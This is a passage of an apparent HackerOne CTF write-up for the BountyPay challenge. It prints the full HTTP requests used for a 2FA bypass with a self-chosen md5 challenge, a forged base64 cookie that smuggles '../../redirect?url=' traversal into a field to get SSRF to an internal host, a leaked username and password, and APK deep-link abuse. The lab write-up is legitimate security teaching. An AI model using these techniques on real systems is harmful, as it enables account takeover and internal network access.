u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;,\u0026quot;challenge_answer\u0026quot;:\u0026quot;bD83Jk27dQ\u0026quot;}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/statements\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:{\u0026quot;month\u0026quot;:\u0026quot;04\u0026quot;,\u0026quot;year\u0026quot;:\u0026quot;2020\u0026quot;},\u0026quot;POST\u0026quot;:[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"step-4-improper-authorization\"\u003eStep 4 - Improper Authorization\u003c/h3\u003e\n\n\u003cp\u003eOnce I tried to login with the credentials that I found, aka \u003ccode\u003eusername: brian.oliver\u003c/code\u003e, \u003ccode\u003epassword: V7h0inzX\u003c/code\u003e, I saw a 2FA. \u003c/p\u003e\n\n\u003cp\u003eLooking into the input fields in the HTML, I saw that the challenge and the challenge\u0026#39;s answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using \u003ccode\u003emd5 -s 1\u003c/code\u003e which resulted with \u003ccode\u003ec4ca4238a0b923820dcc509a6f75849b\u003c/code\u003e and then I just used \u003ccode\u003e1\u003c/code\u003e in order to login, and it worked. The request looked like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\n\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrian.oliver\u0026amp;password\u003cspan class=\"o\"\u003e=\u003c/span\u003eV7h0inzX\u0026amp;challenge\u003cspan class=\"o\"\u003e=\u003c/span\u003ec4ca4238a0b923820dcc509a6f75849b\u0026amp;challenge_answer\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand the response: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eUTF-8\nConnection: keep-alive\nSet-Cookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eexpires\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eThu, 09-Jul-2020 16:14:12 GMT\u003cspan class=\"p\"\u003e;\u003c/span\u003e Max-Age\u003cspan class=\"o\"\u003e=\u003c/span\u003e2592000\nLocation: /\nContent-Length: 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing this new cookie, I was logged in as Brian Oliver.\u003c/p\u003e\n\n\u003ch3 id=\"step-5-ssrf\"\u003eStep 5 - SSRF\u003c/h3\u003e\n\n\u003cp\u003eAfter I bypassed the application\u0026#39;s 2FA using Brain Oliver\u0026#39;s credentials, I tried to play with the application\u0026#39;s feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \u003c/p\u003e\n\n\u003cp\u003eI looked into the request and I saw that it was doing the following request: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eGET /statements?month\u003cspan class=\"o\"\u003e=\u003c/span\u003e01\u0026amp;year\u003cspan class=\"o\"\u003e=\u003c/span\u003e2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nUser-Agent: Mozilla/5.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eMacintosh\u003cspan class=\"p\"\u003e;\u003c/span\u003e Intel Mac OS X 10_15_5\u003cspan class=\"o\"\u003e)\u003c/span\u003e AppleWebKit/537.36 \u003cspan class=\"o\"\u003e(\u003c/span\u003eKHTML, like Gecko\u003cspan class=\"o\"\u003e)\u003c/span\u003e Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nReferer: https://app.bountypay.h1ctf.com/\nCookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile returning the following response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=01\u0026amp;year=2020\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edescription\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTransactions for 2020-01\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etransactions\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:[]}\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \u003c/p\u003e\n\n\u003cp\u003eThe cookie: \u003ccode\u003eeyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\u003c/code\u003e \u003cbr\u003e\nDecoded: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eConsidering the fact that the \u003ccode\u003eaccount_id\u003c/code\u003e was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \u003c/p\u003e\n\n\u003cp\u003eI created a new cookie: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=FUZZ\u0026amp;\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eKnown words and files\u003c/li\u003e\n\u003cli\u003eIdeas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company\u0026#39;s network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePutting everything together, I found a directory listing while fuzzing which leads me to the next step \u003c/p\u003e\n\n\u003ch3 id=\"step-6-information-disclosure-directory-listing-in-house-apk\"\u003eStep 6 - Information Disclosure (Directory Listing, In-house APK)\u003c/h3\u003e\n\n\u003cp\u003eAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eGET /statements?month\u003cspan class=\"o\"\u003e=\u003c/span\u003e01\u0026amp;year\u003cspan class=\"o\"\u003e=\u003c/span\u003e2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ\u003cspan class=\"o\"\u003e==\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand it\u0026#39;s response gave me the hint for the next step: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eredirect?url=https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003esoftware.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=01\u0026amp;year=2020\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;html\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003etitle\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehead\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;body bgcolor=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewhite\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;h1\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eh1\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;a href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ea\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;a href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eBountyPay.apk\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;BountyPay.apk\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ea\u0026gt;                                        20-Apr-2020 11:26              4043701\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003epre\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ebody\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehtml\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL \u003ca title=\"https://software.bountypay.h1ctf.com/uplodas/\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuplodas%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/uplodas/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e worked even for non authenticated users. \u003c/p\u003e\n\n\u003ch3 id=\"step-7-reverse-enginerring-apk\"\u003eStep 7 - Reverse Enginerring (APK)\u003c/h3\u003e\n\n\u003cp\u003eWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \u003c/p\u003e\n\n\u003cp\u003eIn this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. \u003c/p\u003e\n\n\u003cp\u003eOnce I had the code, I ran the APK using Android Studio\u0026#39;s \u0026quot;Profile or debug APK\u0026quot;. \u003c/p\u003e\n\n\u003cp\u003eThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eone://part\u003c/li\u003e\n\u003cli\u003etwo://part\u003c/li\u003e\n\u003cli\u003ethree://part\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eEach part had a required URI with different parameters that were available in the code. \u003c/p\u003e\n\n\u003cp\u003eIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: \u003ccode\u003eone://part?start=PartTwoActivity\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"apk-part-1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i5kLfwqWTs6jdUy8n2UVk5qj?response-content-disposition=attachment%3B%20filename%3D%22apk-part-1.png%22%3B%20filename%2A%3DUTF-8%27%27apk-part-1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=c6560899c9c754e1c7ba3df672fae70e140ad8dc38eb55305f3670e8af03a10a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i5kLfwqWTs6jdUy8n2UVk5qj?response-content-disposition=attachment%3B%20filename%3D%22apk-part-1.png%22%3B%20filename%2A%3DUTF-8%27%27apk-part-1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=c6560899c9c754e1c7ba3df672fae70e140ad8dc38eb55305f3670e8af03a10a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI figured that I needed the \u003ccode\u003estart=PartTwoActivity\u003c/code\u003e together with a username as it was stated in the code: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;start\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PartTwoActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003econtains\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;USERNAME\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estartActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eContext\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003ePartTwoActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce I was on the second Activity, I saw in the code that all inputs where invsible:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight 